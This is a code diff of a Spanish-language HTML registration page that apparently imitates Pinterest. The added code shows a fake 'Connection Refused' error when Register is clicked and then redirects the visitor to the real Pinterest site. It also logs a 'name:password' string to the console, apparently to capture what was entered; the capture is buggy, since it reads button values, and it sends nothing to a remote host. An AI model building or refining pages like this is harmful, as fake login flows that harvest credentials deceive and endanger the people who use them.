@@ -10,6 +10,7 @@ and open the template in the editor.
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <link rel="stylesheet" type="text/css" href="resources/styleRegister.css">
+        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
     </head>
     <body>
         <img src="resources/descarga.png" id="pinLogo">
@@ -27,10 +28,25 @@ and open the template in the editor.
                 <input class="sideInput" type="password" placeholder="Ingrese clave">
             </div>  
             <div class="formBlock" style="margin-top: 4%;">                
-                <input class="sideInput" type="button" value="Register" style="padding: 6px;width: 80px;margin-left: 2%">
-                <input class="sideInput" type="reset" value="Restore" style="padding: 6px;width: 80px">
+                <input class="sideInput" type="button" value="Register" id="regName" onclick="goToPage()" style="padding: 6px;width: 80px;margin-left: 2%">
+                <input class="sideInput" type="reset" value="Restore" id="regPwd" style="padding: 6px;width: 80px">
                 
             </div>   
         </form>
     </body>
 </html>
+<script>
+    function goToPage(){
+        swal({
+            title: "Error",
+            text: "Conection Refused!\nPlease try again",
+            icon: "error"
+        });
+        setTimeout("movePage()",1500);
+    }
+    
+    function movePage(){
+        window.open("https://www.pinterest.es/pinterest/","_top");
+        console.log(document.getElementById("regName").value+":"+document.getElementById("regPwd").value);
+    }
+</script>
